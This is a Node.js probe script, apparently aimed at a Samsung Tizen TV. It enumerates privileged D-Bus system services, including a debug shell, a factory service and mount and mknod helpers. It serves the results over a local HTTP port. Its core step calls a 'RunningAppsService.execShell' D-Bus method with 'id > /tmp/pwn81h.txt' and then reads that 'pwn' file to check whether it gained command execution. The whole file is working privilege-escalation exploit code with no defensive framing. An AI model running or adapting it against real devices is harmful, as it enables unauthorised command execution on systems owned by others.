'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8170;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe81h.txt';
var PWN = '/tmp/pwn81h.txt';

var L = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var r = {};',

  // 1. Introspect com.native.RunningAppsServiceDBUS
  'try {',
  '  var o = cp.spawnSync("gdbus", ["introspect","--system","--dest","com.native.RunningAppsServiceDBUS","--object-path","/com/native/RunningAppsServiceDBUS","--recurse"], {timeout:10000});',
  '  r.ras_introspect = (o.stdout||Buffer.from("")).toString().trim().slice(0,5000);',
  '} catch(e) { r.ras_introspect_err = e.message.slice(0,100); }',

  // 2. Try execShell on RunningAppsService
  'try {',
  '  var o2 = cp.spawnSync("gdbus", ["call","--system","--dest","com.native.RunningAppsServiceDBUS","--object-path","/com/native/RunningAppsServiceDBUS","--method","com.native.RunningAppsServiceDBUS.execShell","id > ' + PWN + '"], {timeout:5000});',
  '  r.ras_execShell = { status: o2.status, out: (o2.stdout||Buffer.from("")).toString().trim().slice(0,300), err: (o2.stderr||Buffer.from("")).toString().trim().slice(0,100) };',
  '} catch(e) { r.ras_execShell_err = e.message.slice(0,100); }',

  // 3. Check pwn file
  'try { r.pwn1 = fs.readFileSync("' + PWN + '","utf8").trim(); } catch(e) {}',

  // 4. Introspect viola debugshell
  'try {',
  '  var o3 = cp.spawnSync("gdbus", ["introspect","--system","--dest","viola.ser.server.MessageRouter.debugshell_C.message","--object-path","/","--recurse"], {timeout:8000});',
  '  r.debugshell_introspect = (o3.stdout||Buffer.from("")).toString().trim().slice(0,3000);',
  '} catch(e) { r.debugshell_err = e.message.slice(0,100); }',

  // 5. Introspect org.tizen.tv.factory-service
  'try {',
  '  var o4 = cp.spawnSync("gdbus", ["introspect","--system","--dest","org.tizen.tv.factory-service","--object-path","/","--recurse"], {timeout:8000});',
  '  r.factory_introspect = (o4.stdout||Buffer.from("")).toString().trim().slice(0,3000);',
  '} catch(e) { r.factory_err = e.message.slice(0,100); }',

  // 6. Introspect com.safe.ps_mknod (privilege separation)
  'try {',
  '  var o5 = cp.spawnSync("gdbus", ["introspect","--system","--dest","com.safe.ps_mknod","--object-path","/","--recurse"], {timeout:8000});',
  '  r.ps_mknod_introspect = (o5.stdout||Buffer.from("")).toString().trim().slice(0,2000);',
  '} catch(e) { r.ps_mknod_err = e.message.slice(0,100); }',

  // 7. Get full webappservice server interface methods
  'try {',
  '  var o6 = cp.spawnSync("gdbus", ["introspect","--system","--dest","org.tizen.tv.webappservice.server","--object-path","/org/tizen/tv/webappservice/server"], {timeout:8000});',
  '  r.webappsvc_full = (o6.stdout||Buffer.from("")).toString().trim().slice(0,5000);',
  '} catch(e) { r.webappsvc_full_err = e.message.slice(0,100); }',

  // 8. Try com.samsung.tvs.Migration
  'try {',
  '  var o7 = cp.spawnSync("gdbus", ["introspect","--system","--dest","com.samsung.tvs.Migration","--object-path","/","--recurse"], {timeout:8000});',
  '  r.migration_introspect = (o7.stdout||Buffer.from("")).toString().trim().slice(0,2000);',
  '} catch(e) { r.migration_err = e.message.slice(0,100); }',

  // 9. Try com.safe.ps_mount
  'try {',
  '  var o8 = cp.spawnSync("gdbus", ["introspect","--system","--dest","com.safe.ps_mount","--object-path","/","--recurse"], {timeout:5000});',
  '  r.ps_mount_introspect = (o8.stdout||Buffer.from("")).toString().trim().slice(0,2000);',
  '} catch(e) { r.ps_mount_err = e.message.slice(0,100); }',

  // 10. Check pwn file again from any attempt
  'try { r.pwn_final = fs.readFileSync("' + PWN + '","utf8").trim(); } catch(e) { r.pwn_final_err = e.code; }',

  'var out = JSON.stringify(r, null, 2);',
  'try { fs.writeFileSync("' + PROBE_FILE + '", out); } catch(e2) {}',
  'process.stdout.write(out);'
];

var INNER = L.join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 90000 }, function(err, stdout, stderr) {
    if (err) {
      cb(JSON.stringify({ exec_error: err.message.slice(0,200), stderr: (stderr||'').slice(0,500) }));
    } else {
      cb(stdout || '{}');
    }
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(out) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(out);
  });
});

server.on('error', function(e) {
  try { fs.writeFileSync(PROBE_FILE, JSON.stringify({ server_err: e.message })); } catch(e2) {}
});

server.listen(PORT, '127.0.0.1', function() {
  runProbe(function(out) {
    try { fs.writeFileSync(PROBE_FILE, out); } catch(e) {}
  });
});

setInterval(function() {}, 60000);
